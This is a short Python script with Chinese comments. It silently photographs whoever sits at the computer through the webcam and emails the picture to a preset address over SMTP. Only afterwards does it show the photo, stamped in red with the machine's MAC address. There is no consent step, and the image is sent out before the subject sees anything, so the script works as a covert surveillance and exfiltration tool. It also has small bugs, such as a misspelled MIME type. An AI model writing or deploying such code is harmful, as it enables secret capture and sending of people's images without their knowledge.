import cv2
import time
import uuid
from smtplib import SMTP_SSL
from email.mime.multipart import MIMEMultipart  # 创建邮件格式
from email.mime.text import MIMEText   # 邮件文本
from email.header import Header  # 创建邮件内容
from PIL import ImageFont,ImageDraw,Image

# 定义函数 file_name，用于生成文件名称，出参为 文件名称。
def generated_file_name():
    fileName = str(int(time.time()))
    fileName = fileName + '.jpg'
    return fileName

# 定义函数 turn_on_camera_take_pictures，用于开启摄像头并拍照。
def turn_on_camera_take_pictures(fileName):
    cap = cv2.VideoCapture(0 + cv2.CAP_DSHOW)
    f,frame = cap.read()
    cv2.imwrite(fileName,frame)
    cap.release()

# 定义函数 get_user_macadress 用于获取主机mac地址。
def get_user_macadress():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    mac = ":".join(mac[x:x+2]for x in range(0,11,2))
    userInfo = 'your mac adress is:{}'.format(mac)
    return userInfo

# 定义函数 show_pictures 用于展示上述得到的图片
def show_pictures(fileName):
    image = Image.open(fileName)
    drawObiect = ImageDraw.Draw(image)
    text = get_user_macadress()
    font = ImageFont.truetype('C:\Windows\Fonts\\ahronbd.ttf',50)
    drawObiect.text((300,100),text,'red',font=font)
    image.show()
    image.save(fileName)

# 定义函数 send_message 用于发送邮件。
def send_message():

    host_server = "服务器"
    password="密码"
    from_mail = "发件人邮箱地址"
    to_mail = "收件人邮箱地址"
    # 设置邮件格式
    msg = MIMEMultipart()
    msg['Subject'] = Header('摄像头照片','utf-8')
    msg['From'] = from_mail
    msg['To'] = to_mail
    # 把图片作为附件
    msg.attach(MIMEText('照片','html','utf-8'))
    image = MIMEText(open(fileName, 'rb').read(), 'base64', 'utf-8')
    image["Content-Type"] = 'image/jmeg'
    msg.attach(image)
    # 发送
    smtp = SMTP_SSL(host_server)
    smtp.login(from_mail,password)
    smtp.sendmail(from_mail,to_mail,msg.as_string()) # 发送
    smtp.quit()

if __name__ == '__main__':
    fileName = generated_file_name()
    turn_on_camera_take_pictures(fileName)
    time.sleep(1)
    send_message()
    time.sleep(4)
    show_pictures(fileName)

